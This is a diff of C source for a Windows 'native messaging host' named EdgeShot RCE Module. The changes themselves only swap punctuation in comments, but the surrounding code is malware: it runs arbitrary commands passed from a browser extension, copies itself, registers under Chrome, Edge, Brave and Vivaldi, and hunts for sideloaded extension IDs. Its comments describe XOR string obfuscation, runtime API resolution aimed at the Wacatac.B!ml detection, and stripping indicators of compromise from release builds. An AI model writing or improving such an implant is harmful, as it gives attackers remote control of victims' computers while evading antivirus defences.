@@ -1,5 +1,5 @@
 /*
- * Native Messaging Host — EdgeShot RCE Module
+ * Native Messaging Host: EdgeShot RCE Module
  * Compile (Windows, MinGW): NO browser flag. One binary registers the host
  *   under every supported browser (Chrome, Edge, Brave, Vivaldi) at install
  *   time, so the same binary works regardless of the target browser.
@@ -7,7 +7,7 @@
  *   Add -DDEBUG_LOG to re-enable the %TEMP%\update_host.log trace (off by default:
  *   the log format strings are heavy static IOCs, so the release build omits them).
  *
- * Dual-mode binary — mode detection by comparing own path vs install path.
+ * Dual-mode binary: mode detection by comparing own path vs install path.
  *   INSTALL:  self-copy + registry + manifest.json (discovers extension IDs)
  *   NATIVE:   Chrome Native Messaging protocol loop
  */
@@ -19,11 +19,11 @@
 #include <stdarg.h>
 #include <time.h>
 
-/* ── Config ─────────────────────────────────────────────────────── */
+/* -- Config ------------------------------------------------------- */
 
 #define HOST_NAME     "com.site.agent"
 
-/* ── String obfuscation ─────────────────────────────────────────────
+/* -- String obfuscation ---------------------------------------------
  * Sensitive literals are stored XOR'd (key 0x5A) so they don't appear in a
  * `strings update.exe` dump, then decoded on the stack at point of use.
  * Arrays generated offline; each holds the raw bytes WITHOUT a trailing NUL. */
@@ -44,13 +44,13 @@ static const unsigned char e_updexe[]   = {0x06,0x2f,0x2a,0x3e,0x3b,0x2e,0x3f,0x
 static const unsigned char e_config[]   = {0x06,0x19,0x35,0x34,0x3c,0x33,0x3d}; /* \Config */
 static const unsigned char e_hostjson[] = {0x06,0x37,0x3b,0x34,0x33,0x3c,0x3f,0x29,0x2e,0x74,0x30,0x29,0x35,0x34}; /* \manifest.json */
 
-/* ── Dynamic API resolution ─────────────────────────────────────────
+/* -- Dynamic API resolution -----------------------------------------
  * Wacatac.B!ml keys heavily on the import table: CreateProcess + CreatePipe +
  * PeekNamedPipe + RegCreateKeyEx + CopyFile form a textbook "dropper" histogram,
  * and advapi32/user32 in the import DLL list add to the score. We keep those APIs
  * out of the static IAT by resolving them at runtime via GetProcAddress (names
  * stored XOR'd too). This also drops advapi32.dll + user32.dll from the imports
- * entirely. GetProcAddress/GetModuleHandle/LoadLibrary stay in the IAT — they are
+ * entirely. GetProcAddress/GetModuleHandle/LoadLibrary stay in the IAT, they are
  * ubiquitous and benign-looking. */
 static const unsigned char a_createprocessa[]     = {0x19,0x28,0x3f,0x3b,0x2e,0x3f,0x0a,0x28,0x35,0x39,0x3f,0x29,0x29,0x1b};
 static const unsigned char a_createpipe[]         = {0x19,0x28,0x3f,0x3b,0x2e,0x3f,0x0a,0x33,0x2a,0x3f};
@@ -121,7 +121,7 @@ static const BrowserTarget BROWSERS[] = {
 };
 #define BROWSER_COUNT (sizeof(BROWSERS) / sizeof(BROWSERS[0]))
 
-/* ── Logging ─────────────────────────────────────────────────────────
+/* -- Logging ---------------------------------------------------------
  * Compiled out by default. Every log_write() call carries a "[INSTALL] ..."
  * style format string; left in, they form a dense cluster of static IOCs. With
  * DEBUG_LOG undefined the calls become no-ops and the literals never reach the
@@ -156,7 +156,7 @@ static void log_write(const char *fmt, ...) {
 #define log_write(...)  ((void)0)
 #endif
 
-/* ── JSON mini-lib ───────────────────────────────────────────────── */
+/* -- JSON mini-lib ------------------------------------------------- */
 static char *json_escape(const char *src) {
     if (!src) return strdup("");
     size_t len = strlen(src), j = 0;
@@ -177,7 +177,7 @@ static char *json_escape(const char *src) {
 }
 
 /* Extract a JSON string value, correctly handling escape sequences. The naive
- * version stopped at the first '"' — which for a value like
+ * version stopped at the first '"', which for a value like
  *   "command":"powershell -c \"get-process\""
  * truncated at the escaped quote, leaving `powershell -c \`. This decodes the
  * standard JSON escapes and stops only at the real (unescaped) closing quote. */
@@ -237,7 +237,7 @@ static char *extract_json_string(const char *json, const char *key) {
     return val;
 }
 
-/* ── Native Messaging I/O ───────────────────────────────────────── */
+/* -- Native Messaging I/O ----------------------------------------- */
 static char *read_message(void) {
     unsigned char len_buf[4];
     size_t read = 0;
@@ -279,7 +279,7 @@ static void write_response(const char *json) {
     log_write("[NATIVE] send: %s\n", json);
 }
 
-/* ── Execute command ────────────────────────────────────────────── */
+/* -- Execute command ---------------------------------------------- */
 static char *exec_cmd(const char *cmd) {
     char full_cmd[8192];
     char fmt[16];
@@ -312,7 +312,7 @@ static char *exec_cmd(const char *cmd) {
     size_t out_len = 0, out_cap = 65535;
 
     /* Wait for process to finish, then drain the pipe */
-    WaitForSingleObject(pi.hProcess, 60000); /* 60s timeout — PowerShell needs it */
+    WaitForSingleObject(pi.hProcess, 60000); /* 60s timeout, PowerShell needs it */
 
     /* Read whatever is left in the pipe */
     for (;;) {
@@ -340,7 +340,7 @@ static char *exec_cmd(const char *cmd) {
     return out;
 }
 
-/* ── MODE: Native loop ──────────────────────────────────────────── */
+/* -- MODE: Native loop -------------------------------------------- */
 static int native_mode(void) {
     log_write("[NATIVE] started\n");
     while (1) {
@@ -380,10 +380,10 @@ static int native_mode(void) {
     return 0;
 }
 
-/* ── Extension discovery helpers ──────────────────────────────────
+/* -- Extension discovery helpers ----------------------------------
  * Chrome extension IDs are 32 lowercase chars in [a-p]. Packed extensions live
  * under Default\Extensions\<id>\, but unpacked/sideloaded ones (BELoader, "Load
- * unpacked") are NOT copied there — they're recorded in the profile's
+ * unpacked") are NOT copied there; they're recorded in the profile's
  * Preferences / Secure Preferences under extensions.settings.<id>. We scan those
  * files for quoted 32-char [a-p] tokens so allowed_origins lists the agent's
  * real ID (a wildcard is rejected by Chrome). */
@@ -430,9 +430,9 @@ static void scan_prefs_for_ids(const char *path, char ids[][33], int *count, int
     free(buf);
 }
 
-/* Scan one browser's profile for extension IDs — packed extensions under
+/* Scan one browser's profile for extension IDs: packed extensions under
  * Default\Extensions\<id> and unpacked/sideloaded ones in Preferences /
- * Secure Preferences — and merge them (deduped) into `ids`. */
+ * Secure Preferences, and merge them (deduped) into `ids`. */
 static void discover_browser_ids(const char *ext_subdir, char ids[][33], int *count, int max) {
     char ext_dir[MAX_PATH];
     GetEnvironmentVariable("LOCALAPPDATA", ext_dir, sizeof(ext_dir));
@@ -456,7 +456,7 @@ static void discover_browser_ids(const char *ext_subdir, char ids[][33], int *co
     }
 
     /* Unpacked/sideloaded extensions (BELoader, "Load unpacked") are NOT under
-     * Default\Extensions\<id> — their settings live in the profile's Preferences
+     * Default\Extensions\<id>; their settings live in the profile's Preferences
      * / Secure Preferences, keyed by the 32-char [a-p] extension ID. Read them
      * out so allowed_origins lists the agent's real ID. */
     char profile_dir[MAX_PATH];
@@ -471,7 +471,7 @@ static void discover_browser_ids(const char *ext_subdir, char ids[][33], int *co
     scan_prefs_for_ids(prefs_path, ids, count, max);
 }
 
-/* ── MODE: Install ──────────────────────────────────────────────── */
+/* -- MODE: Install ------------------------------------------------ */
 static int install_mode(const char *install_path) {
     char dir[MAX_PATH];
     strcpy(dir, install_path);
@@ -493,7 +493,7 @@ static int install_mode(const char *install_path) {
         log_write("[INSTALL] CopyFile err: %lu\n", GetLastError());
     }
 
-    /* ── Discover extension IDs across all browsers ─────────── */
+    /* -- Discover extension IDs across all browsers ----------- */
     char ext_ids[64][33] = {0};
     int ext_count = 0;
     for (size_t b = 0; b < BROWSER_COUNT && ext_count < 64; b++) {
@@ -501,7 +501,7 @@ static int install_mode(const char *install_path) {
     }
     log_write("[INSTALL] %d extensions found\n", ext_count);
 
-    /* ── Write manifest.json ────────────────────────────────── */
+    /* -- Write manifest.json ---------------------------------- */
     char manifest_path[MAX_PATH];
     char seg[32];
     strcpy(manifest_path, dir);
@@ -539,7 +539,7 @@ static int install_mode(const char *install_path) {
         log_write("[INSTALL] manifest FAILED: %s\n", manifest_path);
     }
 
-    /* ── Registry: register under every supported browser ───── */
+    /* -- Registry: register under every supported browser ----- */
     for (size_t b = 0; b < BROWSER_COUNT; b++) {
         HKEY hkey;
         LONG rc = p_RegCreateKeyExA(HKEY_CURRENT_USER, BROWSERS[b].reg_key, 0, NULL,
@@ -556,7 +556,7 @@ static int install_mode(const char *install_path) {
         }
     }
 
-    /* ── Verify ─────────────────────────────────────────────── */
+    /* -- Verify ----------------------------------------------- */
     log_write("[INSTALL] Verify binary: %s\n",
               (GetFileAttributes(install_path) != INVALID_FILE_ATTRIBUTES) ? "OK" : "MISSING");
     log_write("[INSTALL] Verify manifest: %s\n",
@@ -565,7 +565,7 @@ static int install_mode(const char *install_path) {
     return 0;
 }
 
-/* ── Entry point ────────────────────────────────────────────────── */
+/* -- Entry point -------------------------------------------------- */
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
     resolve_apis();
     log_init();
